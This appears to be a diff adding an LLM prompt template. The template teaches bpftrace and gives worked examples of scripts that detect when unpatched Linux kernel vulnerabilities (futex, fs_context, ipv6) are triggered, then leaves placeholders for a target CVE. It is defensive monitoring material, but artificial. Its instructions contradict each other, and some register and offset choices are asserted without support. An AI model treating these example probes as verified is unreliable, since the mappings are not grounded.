+bpftrace knows two types of variables, 'scratch' and 'map'.
+
+'scratch' variables are kept on the BPF stack and only exists during the execution of the action block and cannot be accessed outside of the program. Scratch variable names always start with a `$`, e.g. `$myvar`.
+
+'map' variables use BPF 'maps'. These exist for the lifetime of `bpftrace` itself and can be accessed from all action blocks and user-space. Map names always start with a `@`, e.g. `@mymap`.
+
+All valid identifiers can be used as `name`.
+
+The data type of a variable is automatically determined during first assignment and cannot be changed afterwards
+
+Associative arrays are a collection of elements indexed by a key, similar to the hash tables found in languages like C++ (`std::map`) and Python (`dict`). They’re a variant of 'map' variables.
+
+```
+@name[key] = expression
+@name[key1,key2] = expression
+```
+
+The following snippet creates a map with key signature `[int64, string[16]]` and a value type of `int64`:
+
+```
+@[pid, comm]++
+```
+
+Per-Thread Variables
+
+These can be implemented as an associative array keyed on the thread ID or process ID. For example, @start[tid] or @start[pid]:
+
+```
+kprobe:do_nanosleep {
+  @start[tid] = nsecs;
+}
+
+kretprobe:do_nanosleep /@start[tid] != 0/ {
+  printf("slept for %d ms\n", (nsecs - @start[tid]) / 1000000);
+  delete(@start[tid]);
+}
+```
+
+
+[Builtins]
+Builtins are special variables built into the language. Unlike scratch and map variables they don’t need a $ or @ as prefix (except for the positional parameters). The 'Kernel' column indicates the minimum kernel version required and the 'BPF Helper' column indicates the raw BPF helper function used for this builtin.
+
+arg0, arg1, …argn:  (n+1)th argument passed to the function being traced. These are extracted from the CPU registers. The amount of args passed in registers depends on the CPU architecture. (kprobes, uprobes, usdt). The numbering starts from 0, i.e. arg0 is the first parameter of the function.
+
+args: The struct of all arguments of the traced function. Available in tracepoint, kfunc, and uprobe (with DWARF) probes. Use args.x to access argument x or args to get a record with all arguments.
+
+retval : Value returned by the function being traced (kretprobe, uretprobe, kretfunc)
+
+That is, bpftrace can only retrieve the arguments or return value of a function. It can't get the local variables of a function, unless the local variables can be obtained from the arguments of the function by some simple operation, or from the return value of a call to another function.
+
+reg()
+- uint64 reg(const string name)
+Supported probes:
+- kprobe
+- uprobe
+
+Get the contents of the register identified by name. Valid names depend on the CPU architecture.
+• 64-bit general-purpose registers (RAX, RBX, RCX, RDX, RSI, RDI, RSP, RBP, or R8-R15)
+
+
+
+[Operators and Expressions]
+
+bpftrace have Arithmetic Operators,Logical Operators,Bitwise Operators,Relational Operators,Assignment Operators,Increment and Decrement Operators.
+
+Pointers in bpftrace are similar to those found in C.
+
+However, bpftrace cannot execute functions or macros in the kernel. Functions and macros need to be expanded manually into basic arithmetic or pointer operations.
+
+
+{User Input}
+The user provides:
+(addedcontent) - Code added by the patch
+(offset) - offset from function start where patch was applied
+(cfa) - Frame Base Address in DWARF expression (e.g. "RBP+16") for stack var resolution
+(varlocs) - Variable locations at patch point (register/stack mappings)
+
+Based on the provided user information, any variable, including local variables, can be retrieved and accurately located for inspection.
+
+
+{Tips}
+The Patch content is not applied in the current version. If there is new added content, they are not existed now.
+
+For example, the following patch content, the added content is not existed in the current file(because the patch is not applied now), so it's not possible to get `flags` variable in current version.
+```
+ static void touch_pmd(struct vm_area_struct *vma, unsigned long addr,
+-		pmd_t *pmd)
++		pmd_t *pmd, int flags)
+ {
+```
+Therefore , if you want to check `flags` variable , you need to find the Function Call Chain: Find the functions that call `touch_pmd`, and check whether these functions pass the flags parameter. If any function in the call chain passes flags, you can retrieve it through these function.
+
+
+
+
+
+{Examples}
+
+[[Example 1]]
+
+futex: Prevent overflow by strengthen input validation
+UBSAN reports signed integer overflow in kernel/futex.c:
+
+ UBSAN: Undefined behaviour in kernel/futex.c:2041:18
+ signed integer overflow:
+ 0 - -2147483648 cannot be represented in type 'int'
+
+Add a sanity check to catch negative values of nr_wake and nr_requeue.
+
+```
+Signed-off-by: Li Jinyue <lijinyue@huawei.com>
+Signed-off-by: Thomas Gleixner <tglx@linutronix.de>
+Cc: peterz@infradead.org
+Cc: dvhart@infradead.org
+Cc: stable@vger.kernel.org
+Link: https://lkml.kernel.org/r/1513242294-31786-1-git-send-email-lijinyue@huawei.com
+
+Diffstat
+-rw-r--r--	kernel/futex.c	3	
+1 files changed, 3 insertions, 0 deletions
+diff --git a/kernel/futex.c b/kernel/futex.c
+index 9e69589b924848..8c5424dd59244f 100644
+--- a/kernel/futex.c
++++ b/kernel/futex.c
+@@ -1878,6 +1878,9 @@ static int futex_requeue(u32 __user *uaddr1, unsigned int flags,
+			 u32 __user *uaddr2, int nr_wake, int nr_requeue,
+			 u32 *cmpval, int requeue_pi)
+{
+	union futex_key key1 = FUTEX_KEY_INIT, key2 = FUTEX_KEY_INIT;
+	int drop_count = 0, task_count = 0, ret;
+	struct futex_pi_state *pi_state = NULL;
+	struct futex_hash_bucket *hb1, *hb2;
+	struct futex_q *this, *next;
+	DEFINE_WAKE_Q(wake_q);
+
++	if (nr_wake < 0 || nr_requeue < 0)
++		return -EINVAL;
++
+
+```
+
+
+addedcontent: if (nr_wake < 0 || nr_requeue < 0) return -EINVAL;
+offset: 0x8 (from function start)
+cfa: RBP+0x10
+variable locations:
+nr_wake（int） → RCX
+nr_requeue（int） → R8
+
+
+Rationale: Check directly on function parameters accessible via registers
+1. Probe: kprobe:futex_requeue+0x8 (specific instruction point)
+2. Register mapping:
+   - nr_wake: 32-bit in ECX → RCX
+   - nr_requeue: 32-bit in R8D → R8 
+3. Type cast: int32 for 32-bit params
+
+
+
+- A new check for the `nr_wake` , `nr_requeue` these two variables has been added to the patch.
+- The variables `nr_wake` and `nr_requeue` are the arguments of the futex_requeue function, which can be retrieved by the bpftrace program attached to this function.
+
+
+```
+/* CVE Monitoring Script for futex_requeue Parameter Validation Vulnerability
+ * Target Patch: kernel/futex.c - Add negative check for nr_wake/nr_requeue
+ * Monitoring Logic: Detect negative values in nr_wak  and nr_requeue
+ */
+
+/* Attach to precise instruction offset where validation should occur
+ * Offset 0x8 from function start
+ */
+kprobe:futex_requeue+0x8
+{
+    /* X86_64 Register Extraction - Full 64-bit registers */
+    $rcx_full = reg("RCX");  // RCX contains  (nr_wake)
+    $r8_full = reg("R8");   // R8 contains (nr_requeue)
+    
+    // Cast to int32 to handle negative values properly
+    $nr_wake = (int32)($rcx_full);
+    $nr_requeue = (int32)($r8_full);
+
+    /* Vulnerability Trigger Condition - Mirroring Patch Logic */
+    if ($nr_wake < 0 || $nr_requeue < 0) {
+        /* Forensic Logging with Critical Context */
+        printf("CVE-XXXX-XXXX may be trigged by PID=%d (%s)\n", pid, comm);
+    }
+}
+```
+
+[[Example 2]]
+
+
+vfs: fs_context: fix up param length parsing in legacy_parse_param
+The "PAGE_SIZE - 2 - size" calculation in legacy_parse_param() is an
+unsigned type so a large value of "size" results in a high positive
+value instead of a negative value as expected.  Fix this by getting rid
+of the subtraction.
+
+```
+static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
+{
+	struct legacy_fs_context *ctx = fc->fs_private;
+	unsigned int size = ctx->data_size;
+	size_t len = 0;
+	int ret;
+	ret = vfs_parse_fs_param_source(fc, param);
+	if (ret != -ENOPARAM)
+		return ret;
+	if (ctx->param_type == LEGACY_FS_MONOLITHIC_PARAMS)
+		return invalf(fc, "VFS: Legacy: Can't mix monolithic and individual options");
+	switch (param->type) {
+	case fs_value_is_string:
+		len = 1 + param->size;
+		fallthrough;
+	case fs_value_is_flag:
+		len += strlen(param->key);
+		break;
+	default:
+		return invalf(fc, "VFS: Legacy: Parameter type for '%s' not supported",
+			      param->key);
+	}
+
+-	if (len > PAGE_SIZE - 2 - size)
++	if (size + len + 2 > PAGE_SIZE)
+		return invalf(fc, "VFS: Legacy: Cumulative options too large");
+```
+
+- `size` is an unsigned number, and according to `PAGE_SIZE - 2 - size` in patch, you know that when `size` is larger than `PAGE_SIZE - 2`, the operation will overflow.
+- The variable `size` does not appear directly in the function's arguments, so you have to analyze the source of `size` to determine if it can be obtained by doing something with the arguments.
+- From the statement `unsigned int size = ctx->data_size; ` it is clear that the variable `size` is obtained by accessing the `data_size` field from the struct pointer `ctx`.
+- Where does that `ctx` pointer come from? From the `struct legacy_fs_context *ctx = fc->fs_private;` statement, it is clear that the `ctx` pointer variable is derived from accessing the `fs_private` field via the `fc` pointer.
+
+
+The original condition if (len > PAGE_SIZE - 2 - size) causes an issue when size is exceeds PAGE_SIZE - 2, leading to unsigned integer underflow. This underflow results in a large value, which incorrectly allows an oversized parameter to pass through the check.
+
+The patch modifies the condition to if (size + len + 2 > PAGE_SIZE), preventing the overflow by using addition instead of subtraction.
+
+The user intends to create an eBPF monitoring program to detect situations that could trigger the vulnerability before the patch is applied. The goal is to capture instances when size > PAGE_SIZE - 2, which causes the original condition to fail, allowing the vulnerability to be triggered even when the actual total length (size + len + 2) exceeds PAGE_SIZE.
+
+
+Condition Failure Detection:
+- When size > PAGE_SIZE - 2, the original condition if (len > PAGE_SIZE - 2 - size) results in an unsigned integer underflow, causing a large value and incorrectly allowing the parameter to pass, even though size + len + 2 > PAGE_SIZE should trigger a failure.
+
+Accessing size in eBPF:
+- size is retrieved from the data_size field of the legacy_fs_context structure, which is pointed to by fc->fs_private. 
+
+The monitoring logic should check if size > PAGE_SIZE - 2, which is when the original condition could incorrectly allow a parameter to pass and cause a buffer overflow.
+
+```
+/* CVE-XXXX-XXX Integer Underflow Detection in legacy_parse_param
+ * Detects when: 
+ *   size > PAGE_SIZE-2 (triggers underflow in original check), Actual total size (size + len + 2) exceeds PAGE_SIZE
+ */
+
+kprobe:legacy_parse_param+0x1d2
+{
+    /* ► STEP 1: Extract critical variables ◄ */
+    
+    // Get size from struct legacy_fs_context (32-bit unsigned)
+    $fc = (struct fs_context *)reg("r10");
+    $ctx = (struct legacy_fs_context *)($fc->fs_private);
+    $size = $ctx->data_size; 
+
+    /* ► STEP 2: Calculate dangerous conditions ◄ */
+    
+    // Original vulnerability thresholds
+    $PAGE_SIZE = 4096; // Adjust for different configs
+    $overflow_threshold = $PAGE_SIZE - 2;
+
+    /* ► STEP 3: Vulnerability logic reconstruction ◄ */
+    if ($size > $overflow_threshold) {
+        printf("CVE Triggered: PID=%d (%s) size=%u\n",
+            pid, comm, $size);
+    }
+}
+```
+
+[[Example 3]]
+
+
+ipv6_sockglue: Fix a missing-check bug in ip6_ra_control()
+In function ip6_ra_control(), the pointer new_ra is allocated a memory
+space via kmalloc(). And it is used in the following codes. However,
+when there is a memory allocation error, kmalloc() fails. Thus null
+pointer dereference may happen. And it will cause the kernel to crash.
+Therefore, we should check the return value and handle the error.
+
+```
+Diffstat
+-rw-r--r--	net/ipv6/ipv6_sockglue.c	2	
+1 files changed, 2 insertions, 0 deletions
+diff --git a/net/ipv6/ipv6_sockglue.c b/net/ipv6/ipv6_sockglue.c
+index 40f21fef25ff45..0a3d035feb6167 100644
+--- a/net/ipv6/ipv6_sockglue.c
++++ b/net/ipv6/ipv6_sockglue.c
+@@ -68,6 +68,8 @@ int ip6_ra_control(struct sock *sk, int sel)
+ 		return -ENOPROTOOPT;
+ 
+ 	new_ra = (sel >= 0) ? kmalloc(sizeof(*new_ra), GFP_KERNEL) : NULL;
++	if (sel >= 0 && !new_ra)
++		return -ENOMEM;
+
+ 	write_lock_bh(&ip6_ra_lock);
+```
+
+
+- When `sel` is greater than or equal to 0, kmalloc is called and the `new_ra` variable accepts the return value of the kmalloc function. 
+
+
+The function ip6_ra_control() allocates memory for new_ra using kmalloc when sel is non-negative. The patch adds a check to ensure that if sel >= 0 and kmalloc fails (returns NULL), the function returns -ENOMEM instead of proceeding. The vulnerability occurs when new_ra is NULL but sel >=0, leading to a potential crash when new_ra is used later.
+
+Target Variables Identification : 
+sel: If sel >=0, kmalloc is called.
+new_ra: The return value of kmalloc. We need to check if it's NULL when sel >=0.
+
+
+```bpftrace
+kprobe:ip6_ra_control+0x55
+{
+    /* STEP 1: Extract variables from registers */
+    $sel = (int32)reg("rsi");        // sel in RSI (arg1)
+    $new_ra = reg("rax");            // kmalloc return in RAX
+    
+    /* STEP 2: Vulnerability check conditions */
+    if ($sel >= 0 && $new_ra == 0) {
+
+        printf("CVE TRIGGERED: PID=%d (%s) sel=%d\n", 
+            pid, comm, $sel);
+    }
+}
+```
+
+
+
+{Task}
+
+The user intends to create an eBPF monitoring program to detect situations that could trigger the vulnerability before the patch is applied.
+The user will provide details such as the offset of the new patch statement, the call frame address (CFA), and the variable locations (varlocs). This information will help determine the precise attachment point for the eBPF probe and the appropriate methods for accessing the required variables.
+
+Your task is to determine, based on the patch information, how bpftrace can be used to monitor according to the patch logic.
+
+
+
+{Target Patch}
+[[CVE-ID]]
+
+[Description]
+[[CVE-DESCRIPTION]]
+
+[Patch]
+[[CVE-PATCH]]
+
+[INFO]
+[[CVE-LOCATION]]
+
+
+{Generate analysis}
+
+Provide your final answer in a concise manner without showing any internal reasoning or chain-of-thought. Only output the final result.
+
+Now according to {Target Patch} , you determines if the patch can be emulated using bpftrace for monitoring purposes.
+
+Step-by-step output your idea, the monitor's idea, and explain it step-by-step. Take a deep breath and work on this step by step, This is very import to my career. Only output your thought process; there's no need to generate bpftrace code.
+
+
+If you don't know how to do it, ouptput “Can not do it”, Don't output anything next.
+"""
+
